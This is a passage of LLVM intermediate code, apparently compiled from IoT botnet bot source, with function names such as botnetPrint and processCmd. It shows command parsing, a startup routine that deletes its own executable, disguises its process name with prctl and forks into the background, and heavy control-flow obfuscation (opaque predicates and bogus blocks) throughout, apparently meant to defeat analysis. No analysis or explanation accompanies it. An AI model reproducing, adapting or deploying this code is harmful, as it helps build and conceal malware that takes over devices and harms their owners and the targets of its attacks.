  %577 = load i8, i8* %576, align 1
  %578 = zext i8 %577 to i32
  %579 = call i32 @toupper(i32 %578) #9
  %580 = trunc i32 %579 to i8
  %581 = load i8*, i8** %28, align 8
  store i8 %580, i8* %581, align 1
  %582 = load i8*, i8** %28, align 8
  %583 = getelementptr inbounds i8, i8* %582, i32 1
  store i8* %583, i8** %28, align 8
  br label %571

; <label>:584:                                    ; preds = %571
  store i32 1, i32* %30, align 4
  %585 = load i8*, i8** %25, align 8
  %586 = call i8* @strtok(i8* %585, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.332, i32 0, i32 0)) #3
  store i8* %586, i8** %31, align 8
  %587 = load i8*, i8** %27, align 8
  %588 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 0
  store i8* %587, i8** %588, align 16
  br label %589

; <label>:589:                                    ; preds = %636, %584
  %590 = load i8*, i8** %31, align 8
  %591 = icmp ne i8* %590, null
  br i1 %591, label %592, label %638

; <label>:592:                                    ; preds = %589
  %593 = load i8*, i8** %31, align 8
  %594 = load i8, i8* %593, align 1
  %595 = zext i8 %594 to i32
  %596 = icmp ne i32 %595, 10
  br i1 %596, label %597, label %636

; <label>:597:                                    ; preds = %592
  %598 = load i32, i32* @x.109
  %599 = load i32, i32* @y.110
  %600 = sub i32 %598, 1
  %601 = mul i32 %598, %600
  %602 = urem i32 %601, 2
  %603 = icmp eq i32 %602, 0
  %604 = icmp slt i32 %599, 10
  %605 = or i1 %603, %604
  br i1 %605, label %originalBB123, label %originalBB123alteredBB

originalBB123:                                    ; preds = %originalBB123alteredBB, %597
  %606 = load i8*, i8** %31, align 8
  %607 = call i64 @strlen(i8* %606) #9
  %608 = add i64 %607, 1
  %609 = call noalias i8* @malloc(i64 %608) #3
  %610 = load i32, i32* %30, align 4
  %611 = sext i32 %610 to i64
  %612 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %611
  store i8* %609, i8** %612, align 8
  %613 = load i32, i32* %30, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %614
  %616 = load i8*, i8** %615, align 8
  %617 = load i8*, i8** %31, align 8
  %618 = call i64 @strlen(i8* %617) #9
  %619 = add i64 %618, 1
  call void @llvm.memset.p0i8.i64(i8* %616, i8 0, i64 %619, i32 1, i1 false)
  %620 = load i32, i32* %30, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %621
  %623 = load i8*, i8** %622, align 8
  %624 = load i8*, i8** %31, align 8
  %625 = call i8* @strcpy(i8* %623, i8* %624) #3
  %626 = load i32, i32* %30, align 4
  %627 = add nsw i32 %626, 1
  store i32 %627, i32* %30, align 4
  %628 = load i32, i32* @x.109
  %629 = load i32, i32* @y.110
  %630 = sub i32 %628, 1
  %631 = mul i32 %628, %630
  %632 = urem i32 %631, 2
  %633 = icmp eq i32 %632, 0
  %634 = icmp slt i32 %629, 10
  %635 = or i1 %633, %634
  br i1 %635, label %originalBBpart2142, label %originalBB123alteredBB

originalBBpart2142:                               ; preds = %originalBB123
  br label %636

; <label>:636:                                    ; preds = %originalBBpart2142, %592
  %637 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.332, i32 0, i32 0)) #3
  store i8* %637, i8** %31, align 8
  br label %589

; <label>:638:                                    ; preds = %589
  %639 = load i32, i32* %30, align 4
  %640 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i32 0, i32 0
  call void @processCmd(i32 %639, i8** %640)
  %641 = load i32, i32* %30, align 4
  %642 = icmp sgt i32 %641, 1
  br i1 %642, label %643, label %689

; <label>:643:                                    ; preds = %638
  store i32 1, i32* %32, align 4
  store i32 1, i32* %32, align 4
  br label %644

; <label>:644:                                    ; preds = %originalBBpart2154, %643
  %645 = load i32, i32* %32, align 4
  %646 = load i32, i32* %30, align 4
  %647 = icmp slt i32 %645, %646
  br i1 %647, label %648, label %672

; <label>:648:                                    ; preds = %644
  %649 = load i32, i32* %32, align 4
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %650
  %652 = load i8*, i8** %651, align 8
  call void @free(i8* %652) #3
  br label %653

; <label>:653:                                    ; preds = %648
  %654 = load i32, i32* @x.109
  %655 = load i32, i32* @y.110
  %656 = sub i32 %654, 1
  %657 = mul i32 %654, %656
  %658 = urem i32 %657, 2
  %659 = icmp eq i32 %658, 0
  %660 = icmp slt i32 %655, 10
  %661 = or i1 %659, %660
  br i1 %661, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %653
  %662 = load i32, i32* %32, align 4
  %663 = add nsw i32 %662, 1
  store i32 %663, i32* %32, align 4
  %664 = load i32, i32* @x.109
  %665 = load i32, i32* @y.110
  %666 = sub i32 %664, 1
  %667 = mul i32 %664, %666
  %668 = urem i32 %667, 2
  %669 = icmp eq i32 %668, 0
  %670 = icmp slt i32 %665, 10
  %671 = or i1 %669, %670
  br i1 %671, label %originalBBpart2154, label %originalBB144alteredBB

originalBBpart2154:                               ; preds = %originalBB144
  br label %644

; <label>:672:                                    ; preds = %644
  %673 = load i32, i32* @x.109
  %674 = load i32, i32* @y.110
  %675 = sub i32 %673, 1
  %676 = mul i32 %673, %675
  %677 = urem i32 %676, 2
  %678 = icmp eq i32 %677, 0
  %679 = icmp slt i32 %674, 10
  %680 = or i1 %678, %679
  br i1 %680, label %originalBB156, label %originalBB156alteredBB

originalBB156:                                    ; preds = %originalBB156alteredBB, %672
  %681 = load i32, i32* @x.109
  %682 = load i32, i32* @y.110
  %683 = sub i32 %681, 1
  %684 = mul i32 %681, %683
  %685 = urem i32 %684, 2
  %686 = icmp eq i32 %685, 0
  %687 = icmp slt i32 %682, 10
  %688 = or i1 %686, %687
  br i1 %688, label %originalBBpart2158, label %originalBB156alteredBB

originalBBpart2158:                               ; preds = %originalBB156
  br label %689

; <label>:689:                                    ; preds = %originalBBpart2158, %638
  br label %690

; <label>:690:                                    ; preds = %689, %originalBBpart293
  br label %224

; <label>:691:                                    ; preds = %224
  %692 = load i32, i32* @x.109
  %693 = load i32, i32* @y.110
  %694 = sub i32 %692, 1
  %695 = mul i32 %692, %694
  %696 = urem i32 %695, 2
  %697 = icmp eq i32 %696, 0
  %698 = icmp slt i32 %693, 10
  %699 = or i1 %697, %698
  br i1 %699, label %originalBB160, label %originalBB160alteredBB

originalBB160:                                    ; preds = %originalBB160alteredBB, %691
  %700 = load i32, i32* @x.109
  %701 = load i32, i32* @y.110
  %702 = sub i32 %700, 1
  %703 = mul i32 %700, %702
  %704 = urem i32 %703, 2
  %705 = icmp eq i32 %704, 0
  %706 = icmp slt i32 %701, 10
  %707 = or i1 %705, %706
  br i1 %707, label %originalBBpart2162, label %originalBB160alteredBB

originalBBpart2162:                               ; preds = %originalBB160
  br label %196
                                                  ; No predecessors!
  %709 = load i32, i32* %11, align 4
  ret i32 %709

originalBBalteredBB:                              ; preds = %originalBB, %2
  %710 = alloca i32, align 4
  %711 = alloca i32, align 4
  %712 = alloca i8**, align 8
  %713 = alloca [32 x i8], align 16
  %714 = alloca [32 x i8], align 16
  %715 = alloca i32, align 4
  %716 = alloca i32, align 4
  %717 = alloca i32, align 4
  %718 = alloca i32, align 4
  %719 = alloca [4096 x i8], align 16
  %720 = alloca i32, align 4
  %721 = alloca i32, align 4
  %722 = alloca i32*, align 8
  %723 = alloca i32, align 4
  %724 = alloca i8*, align 8
  %725 = alloca i8*, align 8
  %726 = alloca i8*, align 8
  %727 = alloca i8*, align 8
  %728 = alloca [10 x i8*], align 16
  %729 = alloca i32, align 4
  %730 = alloca i8*, align 8
  %731 = alloca i32, align 4
  store i32 0, i32* %710, align 4
  store i32 %0, i32* %711, align 4
  store i8** %1, i8*** %712, align 8
  %732 = load i8**, i8*** %712, align 8
  %733 = getelementptr inbounds i8*, i8** %732, i64 0
  %734 = load i8*, i8** %733, align 8
  %735 = call i32 @unlink(i8* %734) #3
  call void @rand_init()
  %736 = call i32 @rand_next()
  %_ = shl i32 %736, 4
  %_1 = shl i32 %736, 4
  %737 = urem i32 %736, 4
  %_2 = sub i32 %737, 3
  %gen = mul i32 %_2, 3
  %_3 = sub i32 0, %737
  %gen4 = add i32 %_3, 3
  %_5 = sub i32 %737, 3
  %gen6 = mul i32 %_5, 3
  %_7 = sub i32 0, %737
  %gen8 = add i32 %_7, 3
  %738 = add i32 %737, 3
  %_9 = shl i32 %738, 4
  %_10 = sub i32 %738, 4
  %gen11 = mul i32 %_10, 4
  %_12 = shl i32 %738, 4
  %_13 = sub i32 %738, 4
  %gen14 = mul i32 %_13, 4
  %739 = mul i32 %738, 4
  store i32 %739, i32* %715, align 4
  %740 = getelementptr inbounds [32 x i8], [32 x i8]* %713, i32 0, i32 0
  %741 = load i32, i32* %715, align 4
  call void @rand_alphastr(i8* %740, i32 %741)
  %742 = load i32, i32* %715, align 4
  %743 = sext i32 %742 to i64
  %744 = getelementptr inbounds [32 x i8], [32 x i8]* %713, i64 0, i64 %743
  store i8 0, i8* %744, align 1
  %745 = load i8**, i8*** %712, align 8
  %746 = getelementptr inbounds i8*, i8** %745, i64 0
  %747 = load i8*, i8** %746, align 8
  %748 = getelementptr inbounds [32 x i8], [32 x i8]* %713, i32 0, i32 0
  %749 = call i32 @util_strcpy(i8* %747, i8* %748)
  %750 = call i32 @rand_next()
  %_15 = shl i32 %750, 6
  %_16 = sub i32 0, %750
  %gen17 = add i32 %_16, 6
  %_18 = sub i32 %750, 6
  %gen19 = mul i32 %_18, 6
  %_20 = sub i32 %750, 6
  %gen21 = mul i32 %_20, 6
  %751 = urem i32 %750, 6
  %_22 = sub i32 %751, 3
  %gen23 = mul i32 %_22, 3
  %_24 = sub i32 0, %751
  %gen25 = add i32 %_24, 3
  %_26 = sub i32 %751, 3
  %gen27 = mul i32 %_26, 3
  %_28 = sub i32 %751, 3
  %gen29 = mul i32 %_28, 3
  %_30 = sub i32 0, %751
  %gen31 = add i32 %_30, 3
  %752 = add i32 %751, 3
  %_32 = shl i32 %752, 4
  %_33 = sub i32 %752, 4
  %gen34 = mul i32 %_33, 4
  %_35 = shl i32 %752, 4
  %_36 = sub i32 %752, 4
  %gen37 = mul i32 %_36, 4
  %_38 = sub i32 %752, 4
  %gen39 = mul i32 %_38, 4
  %_40 = shl i32 %752, 4
  %_41 = shl i32 %752, 4
  %_42 = sub i32 0, %752
  %gen43 = add i32 %_42, 4
  %_44 = shl i32 %752, 4
  %753 = mul i32 %752, 4
  store i32 %753, i32* %715, align 4
  %754 = getelementptr inbounds [32 x i8], [32 x i8]* %713, i32 0, i32 0
  %755 = load i32, i32* %715, align 4
  call void @rand_alphastr(i8* %754, i32 %755)
  %756 = load i32, i32* %715, align 4
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds [32 x i8], [32 x i8]* %713, i64 0, i64 %757
  store i8 0, i8* %758, align 1
  %759 = getelementptr inbounds [32 x i8], [32 x i8]* %713, i32 0, i32 0
  %760 = call i32 (i32, ...) @prctl(i32 15, i8* %759) #3
  %761 = call i64 @time(i64* null) #3
  %762 = call i32 @getpid() #3
  %763 = sext i32 %762 to i64
  %_45 = sub i64 0, %761
  %gen46 = add i64 %_45, %763
  %764 = xor i64 %761, %763
  %765 = trunc i64 %764 to i32
  call void @srand(i32 %765) #3
  call void @rand_init()
  %766 = call i32 @getOurIP()
  %767 = call i32 @fork() #3
  store i32 %767, i32* %716, align 4
  %768 = icmp ne i32 %767, 0
  br label %originalBB

originalBB47alteredBB:                            ; preds = %originalBB47, %78
  %769 = load i32, i32* %17, align 4
  %770 = call i32 @waitpid(i32 %769, i32* %19, i32 0)
  call void @exit(i32 0) #11
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %103
  call void @exit(i32 0) #11
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %123
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %140
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %158
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %176
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %200
  %771 = load i32, i32* @KadenCommStock, align 4
  %772 = call i8* @getBuildz()
  %773 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %774 = call i8* @inet_ntoa(i32 %773) #3
  %775 = call i8* @getBuild()
  %776 = call i32 @getEndianness()
  %777 = call i32 (i32, i8*, ...) @botnetPrint(i32 %771, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.330, i32 0, i32 0), i8* %772, i8* %774, i8* %775, i32 %776, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.331, i32 0, i32 0))
  call void @UpdateNameSrvs()
  call void @RemoveTempDirs()
  store i32 0, i32* %21, align 4
  store i32 0, i32* %22, align 4
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %235
  %778 = load i32*, i32** @pids, align 8
  %779 = load i32, i32* %22, align 4
  %780 = sext i32 %779 to i64
  %781 = getelementptr inbounds i32, i32* %778, i64 %780
  %782 = load i32, i32* %781, align 4
  %783 = call i32 @waitpid(i32 %782, i32* null, i32 1)
  %784 = icmp sgt i32 %783, 0
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %312
  %785 = load i32*, i32** @pids, align 8
  %786 = bitcast i32* %785 to i8*
  call void @free(i8* %786) #3
  %787 = load i32*, i32** %23, align 8
  store i32* %787, i32** @pids, align 8
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %333
  %788 = load i32, i32* %22, align 4
  %_84 = sub i32 %788, 1
  %gen85 = mul i32 %_84, 1
  %_86 = sub i32 %788, 1
  %gen87 = mul i32 %_86, 1
  %789 = add nsw i32 %788, 1
  store i32 %789, i32* %22, align 4
  br label %originalBB83

originalBB91alteredBB:                            ; preds = %originalBB91, %352
  %790 = load i32, i32* %21, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds [4096 x i8], [4096 x i8]* %20, i64 0, i64 %791
  store i8 0, i8* %792, align 1
  %793 = getelementptr inbounds [4096 x i8], [4096 x i8]* %20, i32 0, i32 0
  call void @trim(i8* %793)
  %794 = getelementptr inbounds [4096 x i8], [4096 x i8]* %20, i32 0, i32 0
  store i8* %794, i8** %25, align 8
  %795 = load i8*, i8** %25, align 8
  %796 = load i8, i8* %795, align 1
  %797 = zext i8 %796 to i32
  %798 = icmp eq i32 %797, 33
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %391
  br label %originalBB95

originalBB99alteredBB:                            ; preds = %originalBB99, %418
  %799 = load i8*, i8** %26, align 8
  store i8 0, i8* %799, align 1
  %800 = load i8*, i8** %25, align 8
  %801 = getelementptr inbounds i8, i8* %800, i64 1
  store i8* %801, i8** %26, align 8
  %802 = load i8*, i8** %25, align 8
  %803 = load i8*, i8** %26, align 8
  %804 = call i64 @strlen(i8* %803) #9
  %805 = getelementptr inbounds i8, i8* %802, i64 %804
  %806 = getelementptr inbounds i8, i8* %805, i64 2
  store i8* %806, i8** %25, align 8
  br label %originalBB99

originalBB103alteredBB:                           ; preds = %originalBB103, %471
  %807 = load i8*, i8** %25, align 8
  %808 = load i8, i8* %807, align 1
  %809 = zext i8 %808 to i32
  %810 = icmp ne i32 %809, 32
  br label %originalBB103

originalBB107alteredBB:                           ; preds = %originalBB107, %492
  %811 = load i8*, i8** %25, align 8
  %812 = load i8, i8* %811, align 1
  %813 = zext i8 %812 to i32
  %814 = icmp ne i32 %813, 0
  br label %originalBB107

originalBB111alteredBB:                           ; preds = %originalBB111, %513
  br label %originalBB111

originalBB115alteredBB:                           ; preds = %originalBB115, %531
  %815 = load i8*, i8** %25, align 8
  %816 = getelementptr inbounds i8, i8* %815, i32 1
  store i8* %816, i8** %25, align 8
  br label %originalBB115

originalBB119alteredBB:                           ; preds = %originalBB119, %550
  %817 = load i8*, i8** %25, align 8
  store i8 0, i8* %817, align 1
  %818 = load i8*, i8** %25, align 8
  %819 = getelementptr inbounds i8, i8* %818, i32 1
  store i8* %819, i8** %25, align 8
  %820 = load i8*, i8** %27, align 8
  store i8* %820, i8** %28, align 8
  br label %originalBB119

originalBB123alteredBB:                           ; preds = %originalBB123, %597
  %821 = load i8*, i8** %31, align 8
  %822 = call i64 @strlen(i8* %821) #9
  %_124 = sub i64 %822, 1
  %gen125 = mul i64 %_124, 1
  %_126 = shl i64 %822, 1
  %_127 = shl i64 %822, 1
  %_128 = sub i64 %822, 1
  %gen129 = mul i64 %_128, 1
  %823 = add i64 %822, 1
  %824 = call noalias i8* @malloc(i64 %823) #3
  %825 = load i32, i32* %30, align 4
  %826 = sext i32 %825 to i64
  %827 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %826
  store i8* %824, i8** %827, align 8
  %828 = load i32, i32* %30, align 4
  %829 = sext i32 %828 to i64
  %830 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %829
  %831 = load i8*, i8** %830, align 8
  %832 = load i8*, i8** %31, align 8
  %833 = call i64 @strlen(i8* %832) #9
  %_130 = sub i64 %833, 1
  %gen131 = mul i64 %_130, 1
  %_132 = shl i64 %833, 1
  %_133 = sub i64 %833, 1
  %gen134 = mul i64 %_133, 1
  %_135 = sub i64 %833, 1
  %gen136 = mul i64 %_135, 1
  %_137 = shl i64 %833, 1
  %834 = add i64 %833, 1
  call void @llvm.memset.p0i8.i64(i8* %831, i8 0, i64 %834, i32 1, i1 false)
  %835 = load i32, i32* %30, align 4
  %836 = sext i32 %835 to i64
  %837 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %836
  %838 = load i8*, i8** %837, align 8
  %839 = load i8*, i8** %31, align 8
  %840 = call i8* @strcpy(i8* %838, i8* %839) #3
  %841 = load i32, i32* %30, align 4
  %_138 = shl i32 %841, 1
  %_139 = sub i32 0, %841
  %gen140 = add i32 %_139, 1
  %842 = add nsw i32 %841, 1
  store i32 %842, i32* %30, align 4
  br label %originalBB123

originalBB144alteredBB:                           ; preds = %originalBB144, %653
  %843 = load i32, i32* %32, align 4
  %_145 = sub i32 %843, 1
  %gen146 = mul i32 %_145, 1
  %_147 = sub i32 0, %843
  %gen148 = add i32 %_147, 1
  %_149 = sub i32 0, %843
  %gen150 = add i32 %_149, 1
  %_151 = shl i32 %843, 1
  %_152 = shl i32 %843, 1
  %844 = add nsw i32 %843, 1
  store i32 %844, i32* %32, align 4
  br label %originalBB144

originalBB156alteredBB:                           ; preds = %originalBB156, %672
  br label %originalBB156

originalBB160alteredBB:                           ; preds = %originalBB160, %691
  br label %originalBB160
}

; Function Attrs: nounwind
declare i32 @unlink(i8*) #1

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) #1

declare i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: nounwind
declare i32 @chdir(i8*) #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #1

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %106

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %40, %15
  %18 = load i32, i32* @x.111
  %19 = load i32, i32* @y.112
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i8*, i8** %12, align 8
  %27 = load i8, i8* %26, align 1
  %28 = icmp ne i8 %27, 0
  %29 = load i32, i32* @x.111
  %30 = load i32, i32* @y.112
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %28, label %37, label %43

; <label>:37:                                     ; preds = %originalBBpart2
  %38 = load i32, i32* %11, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %11, align 4
  br label %40

; <label>:40:                                     ; preds = %37
  %41 = load i8*, i8** %12, align 8
  %42 = getelementptr inbounds i8, i8* %41, i32 1
  store i8* %42, i8** %12, align 8
  br label %17

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i32, i32* @x.111
  %45 = load i32, i32* @y.112
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  %52 = load i32, i32* %11, align 4
  %53 = load i32, i32* %7, align 4
  %54 = icmp sge i32 %52, %53
  %55 = load i32, i32* @x.111
  %56 = load i32, i32* @y.112
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %54, label %63, label %80

; <label>:63:                                     ; preds = %originalBBpart24
  %64 = load i32, i32* @x.111
  %65 = load i32, i32* @y.112
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %63
  store i32 0, i32* %7, align 4
  %72 = load i32, i32* @x.111
  %73 = load i32, i32* @y.112
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %100

; <label>:80:                                     ; preds = %originalBBpart24
  %81 = load i32, i32* @x.111
  %82 = load i32, i32* @y.112
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %80
  %89 = load i32, i32* %11, align 4
  %90 = load i32, i32* %7, align 4
  %91 = sub nsw i32 %90, %89
  store i32 %91, i32* %7, align 4
  %92 = load i32, i32* @x.111
  %93 = load i32, i32* @y.112
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart219, label %originalBB10alteredBB

originalBBpart219:                                ; preds = %originalBB10
  br label %100

; <label>:100:                                    ; preds = %originalBBpart219, %originalBBpart28
  %101 = load i32, i32* %8, align 4
  %102 = and i32 %101, 2
  %103 = icmp ne i32 %102, 0
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %100
  store i32 48, i32* %10, align 4
  br label %105

; <label>:105:                                    ; preds = %104, %100
  br label %106

; <label>:106:                                    ; preds = %105, %4
  %107 = load i32, i32* %8, align 4
  %108 = and i32 %107, 1
  %109 = icmp ne i32 %108, 0
  br i1 %109, label %139, label %110

; <label>:110:                                    ; preds = %106
  br label %111

; <label>:111:                                    ; preds = %119, %110
  %112 = load i32, i32* %7, align 4
  %113 = icmp sgt i32 %112, 0
  br i1 %113, label %114, label %122

; <label>:114:                                    ; preds = %111
  %115 = load i8**, i8*** %5, align 8
  %116 = load i32, i32* %10, align 4
  call void @printchar(i8** %115, i32 %116)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %9, align 4
  br label %119

; <label>:119:                                    ; preds = %114
  %120 = load i32, i32* %7, align 4
  %121 = add nsw i32 %120, -1
  store i32 %121, i32* %7, align 4
  br label %111

; <label>:122:                                    ; preds = %111
  %123 = load i32, i32* @x.111
  %124 = load i32, i32* @y.112
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %122
  %131 = load i32, i32* @x.111
  %132 = load i32, i32* @y.112
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %139

; <label>:139:                                    ; preds = %originalBBpart223, %106
  %140 = load i32, i32* @x.111
  %141 = load i32, i32* @y.112
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %139
  %148 = load i32, i32* @x.111
  %149 = load i32, i32* @y.112
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %156

; <label>:156:                                    ; preds = %originalBBpart231, %originalBBpart227
  %157 = load i8*, i8** %6, align 8
  %158 = load i8, i8* %157, align 1
  %159 = icmp ne i8 %158, 0
  br i1 %159, label %160, label %186

; <label>:160:                                    ; preds = %156
  %161 = load i8**, i8*** %5, align 8
  %162 = load i8*, i8** %6, align 8
  %163 = load i8, i8* %162, align 1
  %164 = zext i8 %163 to i32
  call void @printchar(i8** %161, i32 %164)
  %165 = load i32, i32* %9, align 4
  %166 = add nsw i32 %165, 1
  store i32 %166, i32* %9, align 4
  br label %167

; <label>:167:                                    ; preds = %160
  %168 = load i32, i32* @x.111
  %169 = load i32, i32* @y.112
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %167
  %176 = load i8*, i8** %6, align 8
  %177 = getelementptr inbounds i8, i8* %176, i32 1
  store i8* %177, i8** %6, align 8
  %178 = load i32, i32* @x.111
  %179 = load i32, i32* @y.112
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %156

; <label>:186:                                    ; preds = %156
  br label %187

; <label>:187:                                    ; preds = %195, %186
  %188 = load i32, i32* %7, align 4
  %189 = icmp sgt i32 %188, 0
  br i1 %189, label %190, label %198

; <label>:190:                                    ; preds = %187
  %191 = load i8**, i8*** %5, align 8
  %192 = load i32, i32* %10, align 4
  call void @printchar(i8** %191, i32 %192)
  %193 = load i32, i32* %9, align 4
  %194 = add nsw i32 %193, 1
  store i32 %194, i32* %9, align 4
  br label %195

; <label>:195:                                    ; preds = %190
  %196 = load i32, i32* %7, align 4
  %197 = add nsw i32 %196, -1
  store i32 %197, i32* %7, align 4
  br label %187

; <label>:198:                                    ; preds = %187
  %199 = load i32, i32* %9, align 4
  ret i32 %199

originalBBalteredBB:                              ; preds = %originalBB, %17
  %200 = load i8*, i8** %12, align 8
  %201 = load i8, i8* %200, align 1
  %202 = icmp ne i8 %201, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  %203 = load i32, i32* %11, align 4
  %204 = load i32, i32* %7, align 4
  %205 = icmp sge i32 %203, %204
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %63
  store i32 0, i32* %7, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %80
  %206 = load i32, i32* %11, align 4
  %207 = load i32, i32* %7, align 4
